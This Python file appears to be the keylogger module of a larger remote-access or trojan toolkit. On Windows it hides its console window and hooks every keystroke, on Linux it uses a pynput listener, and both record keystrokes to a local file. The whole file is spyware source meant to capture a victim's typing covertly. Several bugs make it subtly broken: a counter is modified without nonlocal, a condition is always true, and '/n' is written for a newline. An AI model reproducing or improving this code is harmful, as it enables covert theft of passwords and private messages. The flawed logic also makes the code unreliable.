import random

# for the keylogger in windows: https://www.geeksforgeeks.org/design-a-keylogger-in-python


def run(*args):
    print("[*] In module keylogger")
    amountStrokes = random.randint(5, 50)

    if args[0] == "windows":
        import win32api
        import win32console
        import win32gui
        import pythoncom
        import pyHook

        win = win32console.GetConsoleWindow()
        win32gui.ShowWindow(win, 0)

        def OnKeyboardEvent(event):
            amountStrokes -= 1
            if event.Ascii == 5:
                exit(1)

            if event.Ascii != 0 or 8:
                # open output.txt to read current keystrokes
                f = open("./data/keylog.txt", "r+")
                buffer = f.read()
                f.close()
                # open output.txt to write current + new keystrokes
                f = open("./data/keylog.txt", "w")
                keylogs = chr(event.Ascii)

                if event.Ascii == 13:
                    keylogs = "/n"
                    buffer += keylogs
                    f.write(buffer)
                    f.close()

            if amountStrokes == 0:
                f = open("./data/keylog.txt", "r")
                return f

        # create a hook manager object
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent

        # set the hook
        hm.HookKeyboard()

        # wait forever
        pythoncom.PumpMessages()

    elif args[0] == "linux":
        from pynput.keyboard import Key, Listener
        import logging

        logging.basicConfig(
            filename="./data/keylog.txt", level=logging.DEBUG, format="key: %(message)s"
        )

        def on_press(key):
            amountStrokes -= 1
            logging.info(str(key))

            if amountStrokes == 0:
                f = open("./data/keylog.txt", "r")
                return f

        with Listener(on_press=on_press) as listener:
            listener.join()

    elif args[0] == "macos":
        return "the logger found macOS, logger not implemented"

    else:
        return "no known OS found"
